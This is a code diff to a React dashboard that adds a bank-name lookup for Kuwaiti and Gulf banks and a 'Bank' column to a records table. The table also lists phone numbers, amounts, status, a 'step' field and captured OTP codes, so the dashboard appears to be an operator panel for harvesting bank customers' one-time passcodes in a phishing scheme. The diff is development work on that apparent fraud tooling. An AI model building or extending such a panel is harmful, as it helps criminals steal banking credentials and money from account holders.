@@ -26,6 +26,25 @@ import { useToast } from "@/components/ui/use-toast";
 
 // ─── Sub-components ───────────────────────────────────────────────────────────
 
+const BANK_NAMES = {
+  ABK: "Al Ahli Bank of Kuwait",
+  ALRAJHI: "Al Rajhi Bank",
+  BBK: "Bank of Bahrain and Kuwait",
+  BOUBYAN: "Boubyan Bank",
+  BURGAN: "Burgan Bank",
+  CBK: "Commercial Bank of Kuwait",
+  Doha: "Doha Bank",
+  GBK: "Gulf Bank",
+  TAM: "TAM Bank",
+  KFH: "Kuwait Finance House",
+  KIB: "Kuwait International Bank",
+  NBK: "National Bank of Kuwait",
+  Weyay: "Weyay Bank",
+  QNB: "Qatar National Bank",
+  UNB: "Union National Bank",
+  WARBA: "Warba Bank"
+};
+
 function StatisticsCard({ title, value, icon: Icon, color, trend }) {
   return (
     <Card className="relative overflow-hidden bg-slate-900/70 border border-slate-800/50 shadow-xl shadow-black/20 hover:shadow-2xl transition-all duration-300 group backdrop-blur-sm">
@@ -477,6 +496,7 @@ export default function Dashboard() {
                       {[
                         { label: "الهاتف / المعلومات", key: null },
                         { label: "المبلغ", key: "amount" },
+                        { label: "البنك", key: null },
                         { label: "الحالة", key: "status" },
                         { label: "الخطوة", key: null },
                         { label: "OTP", key: null },
@@ -518,6 +538,13 @@ export default function Dashboard() {
                           </td>
                           <td className="px-4 py-3">
                             {r.amount ? <Badge variant="outline" className="font-mono text-emerald-400 border-emerald-500/30">{r.amount}</Badge> : <span className="text-slate-500">—</span>}
+                          </td>
+                          <td className="px-4 py-3">
+                            {r.bank && BANK_NAMES[r.bank] ? (
+                              <span className="text-sm text-slate-300">{BANK_NAMES[r.bank]}</span>
+                            ) : (
+                              <span className="text-slate-500">—</span>
+                            )}
                           </td>
                           <td className="px-4 py-3"><StatusBadge status={statusLabel} /></td>
                           <td className="px-4 py-3 text-center">
